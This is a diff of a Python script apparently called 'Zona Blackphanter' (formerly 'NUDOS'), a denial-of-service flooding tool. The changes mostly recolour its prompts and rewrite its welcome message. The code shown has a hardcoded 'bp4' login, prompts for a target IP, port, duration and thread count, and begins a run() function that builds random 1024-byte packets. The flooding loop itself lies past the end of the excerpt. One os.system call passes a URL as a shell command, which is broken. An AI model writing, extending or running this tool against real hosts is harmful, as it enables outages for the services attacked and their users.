@@ -28,7 +28,7 @@ class bcolors:
     WHITE   = "\033[37m"
 
 os.system("clear")
-os.system("https://github.com")
+os.system("https://github.com/Kodekeras24")
 print("\033[37mWelcome to Zona Blackphanter")
 time.sleep(2)
 print("Loading.......")
@@ -54,22 +54,22 @@ print("\033[95m             SHOULD ONLY BE USED FOR GOOD PURPOSES               
 print("\033[94m—_—_—_—_—_—_—_—_—_—_—_—_—_——_—_—_—_—_—_—_—_—_—_—_—_—_—_——_—_—_—__—\033[0m")
 
 while attemps < 100:
-    username = input('Enter your username: ')
-    password = input('Enter your password: ')
+    username = input("\033[32mEnter your username: \033[0m")
+    password = input("\033[31mEnter your password: \033[0m")
 
     if username == 'bp4' and password == 'bp4':
-        print('You have successfully logged in Welcome to NUDOS!!')
+        print("Hai...! Welcome to zona attack BLACKPHANTER")
         break
     else:
         print('Incorrect credentials. Check if you have Caps lock on and try again.')
         attemps += 1
         continue
 
-ip = str(input(" Target IP :"))
-port = int(input(" Target Port :"))
-choice = str(input(" (y/n) :"))
-times = int(input(" Time :"))
-threads = int(input(" Threads :"))
+ip = str(input("\033[95m Target IP :\033[0m"))
+port = int(input("\033[94m Target Port :\033[0m"))
+choice = str(input("\033[31m (y/n) :\033[0m"))
+times = int(input("\033[33m Time :\033[0m"))
+threads = int(input("\033[37m Threads :\033[0m"))
 def run():
 	data = random._urandom(1024)
 	i = random.choice(("[#]"))
